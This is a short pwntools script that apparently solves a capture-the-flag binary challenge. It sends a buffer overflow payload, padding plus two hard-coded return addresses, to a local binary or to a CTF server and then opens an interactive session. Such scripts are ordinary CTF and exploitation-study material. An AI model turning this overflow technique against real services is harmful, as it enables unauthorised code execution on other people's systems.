#!/usr/bin/python3

from pwn import *

exe = ELF('out', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*pwnable+70

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('tjc.tf', 31080)
else:
    p = process(exe.path)

GDB()
payload = b"a" * 18 + p64(0x00000000401284) + b"a"*8 + p64(0x00000000004011b4)
sa(b"> ", payload)
p.interactive()
